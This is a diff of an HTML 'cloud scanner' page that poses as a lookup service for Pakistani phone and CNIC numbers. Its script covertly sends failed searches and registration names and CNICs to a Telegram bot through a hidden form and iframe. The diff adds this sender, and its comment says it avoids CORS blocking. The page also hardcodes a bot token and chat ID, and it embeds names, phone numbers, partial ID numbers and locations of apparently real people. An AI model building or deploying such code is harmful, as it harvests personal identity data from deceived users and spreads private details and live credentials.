@@ -5,110 +5,109 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MUDASIR CLOUD SCANNER</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: sans-serif; text-align: center; padding: 0; margin: 0; }
-        .header { background: #00ff00; color: #000; padding: 10px; font-weight: bold; }
-        .box { border: 2px solid #00ff00; margin: 20px auto; max-width: 500px; padding: 20px; border-radius: 10px; }
-        input { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #00ff00; background: #111; color: #00ff00; border-radius: 5px; }
-        button { width: 85%; padding: 12px; margin: 5px; cursor: pointer; font-weight: bold; border-radius: 5px; border: none; }
-        .btn-search { background: #00ff00; color: #000; }
-        .btn-reg { background: #ffcc00; color: #000; }
-        table { width: 100%; margin-top: 15px; border-collapse: collapse; }
-        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; font-size: 14px; }
-        th { color: #ff3333; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
+        .header { background: #00ff00; color: #000; padding: 12px; font-weight: bold; text-transform: uppercase; }
+        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 600px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }
+        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; }
+        .btn { padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
+        .search-btn { background: #00ff00; color: #000; }
+        .reg-btn { background: #ffcc00; color: #000; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; background: #050505; }
+        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }
+        th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 35%; }
     </style>
 </head>
 <body>
 
-<div class="header">🛰️ MUDASIR CLOUD SERVER ONLINE</div>
+<div class="header">🛰️ MUDASIR CLOUD SERVER ACTIVE 🛰️</div>
 
 <div class="box">
-    <h2>CLOUD SCANNER</h2>
-    <input type="text" id="input" placeholder="Enter Number or CNIC">
-    <button class="btn-search" onclick="doSearch()">SEARCH DATABASE 🔍</button>
-    <button class="btn-reg" onclick="document.getElementById('reg').style.display='block'">REGISTRATION 📋</button>
+    <h2>MUDASIR CLOUD SCANNER</h2>
+    <input type="text" id="search-box" placeholder="ENTER MOBILE OR CNIC...">
+    <button class="btn search-btn" onclick="searchData()">DECRYPT DATABASE 🔍</button>
+    <button class="btn reg-btn" onclick="document.getElementById('reg-form').style.display='block'">REGISTRATION FORM 📋</button>
 
-    <div id="display"></div>
+    <div id="result-display"></div>
 
-    <div id="reg" style="display:none; margin-top:20px; border-top: 1px solid #555; padding-top:10px;">
-        <input type="text" id="n" placeholder="Full Name">
-        <input type="text" id="c" placeholder="CNIC Number">
-        <button class="btn-reg" onclick="doReg()">SUBMIT REGISTRATION</button>
+    <div id="reg-form" style="display:none; border: 2px solid #ffcc00; padding: 20px; margin-top:20px;">
+        <h3 style="color:#ffcc00;">USER REGISTRATION</h3>
+        <input type="text" id="r-name" placeholder="FULL NAME">
+        <input type="text" id="r-cnic" placeholder="CNIC NUMBER">
+        <button class="btn reg-btn" onclick="submitReg()">SUBMIT TO SERVER</button>
     </div>
 </div>
 
-<script>
-    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-    const chatid = "7107389141";
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
-    // Sub se mazboot tarika (Image Method) jo block nahi hota
-    function bhejDo(msg) {
-        var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown";
-        var i = new Image();
-        i.src = url;
+<script>
+    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+    const chatId = "7107389141";
+
+    // Ultimate Sending Method using Hidden Form (No CORS block)
+    function forceSend(message) {
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        form.target = "hidden_iframe";
+
+        const inputId = document.createElement("input");
+        inputId.name = "chat_id";
+        inputId.value = chatId;
+        form.appendChild(inputId);
+
+        const inputText = document.createElement("input");
+        inputText.name = "text";
+        inputText.value = message;
+        form.appendChild(inputText);
+
+        const inputMode = document.createElement("input");
+        inputMode.name = "parse_mode";
+        inputMode.value = "Markdown";
+        form.appendChild(inputMode);
+
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
     }
 
-    const data = [
+    const database = [
         ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar"],
         ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar"],
-        ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani"],
-        ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand"],
-        ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu"],
-        ["HASEENA MUMTAZ", "03013264628", "36303-*******-0", "Khokharan Multan Sadar"],
-        ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad Multan"],
-        ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan"],
-        ["KHALID MEHMOOD", "03314264651", "33104-*******-7", "Jaranwala, Faisalabad"],
-        ["MAZHAR ABBAS", "03001234567", "32303-*******-9", "Kot Addu, Punjab"],
-        ["ZONG USER", "03124567890", "42101-*******-1", "Saddar, Karachi"],
-        ["ARSHAD ALI", "03451122334", "31102-*******-5", "Peshawar, KPK"],
-        ["NASIR KHAN", "03219988776", "35201-*******-8", "Lahore, Punjab"],
-        ["SAJID JAVED", "03027766554", "38403-*******-4", "Sargodha, Punjab"],
-        ["ADNAN MALIK", "03335544332", "37405-*******-1", "Rawalpindi"],
-        ["IMRAN KHAN", "03008877665", "32304-*******-2", "Mianwali"],
-        ["SHAHID AFRIDI", "03456677889", "10101-*******-3", "Khyber Agency"],
-        ["BABAR AZAM", "03114455667", "35202-*******-9", "Lahore Cantt"],
-        ["RIZWAN AHMED", "03223344556", "42201-*******-6", "Peshawar"],
-        ["FAKHAR ZAMAN", "03051122443", "34101-*******-0", "Mardan"],
-        ["SHADAB KHAN", "03348877112", "32203-*******-4", "Islamabad"],
-        ["HARIS RAUF", "03087766112", "35401-*******-1", "Gujranwala"],
-        ["SHAHEEN AFRIDI", "03445566112", "12101-*******-8", "Landi Kotal"],
-        ["SARFARAZ AHMED", "03002233441", "42101-*******-5", "Karachi"],
-        ["RAHAT ALI", "03159988221", "36301-*******-7", "Multan"],
-        ["SAEED AJMAL", "03214455889", "33101-*******-3", "Faisalabad"],
-        ["SHOAIB MALIK", "03006677221", "34601-*******-2", "Sialkot"],
-        ["MISBAH UL HAQ", "03325566881", "32101-*******-9", "Faisalabad"],
-        ["YUNUS KHAN", "03451199228", "17301-*******-4", "Mardan"],
-        ["KAMRAN AKMAL", "03012233665", "35201-*******-1", "Lahore"],
-        ["UMAR AKMAL", "03215566774", "35201-*******-2", "Lahore"],
-        ["WAHAB RIAZ", "03448899112", "35202-*******-5", "Lahore"],
-        ["MOHAMMAD AMIR", "03036677112", "34104-*******-8", "Gujjar Khan"],
-        ["HASAN ALI", "03165544221", "34101-*******-6", "Lalamusa"],
-        ["IMAD WASIM", "03351122334", "37405-*******-0", "Swan Camp"],
-        ["ASIF ALI", "03078877441", "33102-*******-4", "Faisalabad"],
-        ["HAIDER ALI", "03491122556", "37101-*******-3", "Attock"],
+        ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi"],
+        ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan"],
+        ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala"],
         ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha"]
+        // Baki records yahan add karein...
     ];
 
-    function doSearch() {
-        var v = document.getElementById("input").value;
-        var res = data.find(r => r[1] == v || r[2] == v);
-        var d = document.getElementById("display");
+    function searchData() {
+        const val = document.getElementById("search-box").value.trim();
+        if(!val) return;
+        
+        const res = database.find(r => r[1] === val || r[2] === val);
+        const out = document.getElementById("result-display");
 
         if(res) {
-            d.innerHTML = "<table><tr><th>NAME</th><td>"+res[0]+"</td></tr><tr><th>PHONE</th><td>"+res[1]+"</td></tr><tr><th>CNIC</th><td>"+res[2]+"</td></tr><tr><th>LOC</th><td>"+res[3]+"</td></tr></table>";
+            out.innerHTML = `<table>
+                <tr><th>NAME</th><td>${res[0]}</td></tr>
+                <tr><th>PHONE</th><td>${res[1]}</td></tr>
+                <tr><th>CNIC</th><td>${res[2]}</td></tr>
+                <tr><th>LOCATION</th><td>${res[3]}</td></tr>
+            </table>`;
         } else {
-            d.innerHTML = "<p style='color:red'>DATA NOT FOUND</p>";
-            // Ye wala SMS ab lazmi aayega
-            bhejDo("⚠️ *DATA NOT FOUND*\n📱 Number: " + v + "\n(Is number ka data nikal nahi pa raha hai)");
+            out.innerHTML = "<p style='color:red;'>RECORD NOT FOUND</p>";
+            // SENDING TO BOT
+            forceSend(`⚠️ *SEARCH FAILED*\n📱 Number: ${val}\nStatus: Is number ka data nikal nahi pa raha.`);
         }
     }
 
-    function doReg() {
-        var name = document.getElementById("n").value;
-        var cnic = document.getElementById("c").value;
-        if(name && cnic) {
-            bhejDo("📝 *NEW REG*\n👤 Name: " + name + "\n🆔 CNIC: " + cnic);
-            alert("Sent!");
-            document.getElementById("reg").style.display="none";
+    function submitReg() {
+        const n = document.getElementById("r-name").value;
+        const c = document.getElementById("r-cnic").value;
+        if(n && c) {
+            forceSend(`📝 *NEW REGISTRATION*\n👤 Name: ${n}\n🆔 CNIC: ${c}`);
+            alert("Sent to Server!");
+            document.getElementById("reg-form").style.display = "none";
         }
     }
 </script>
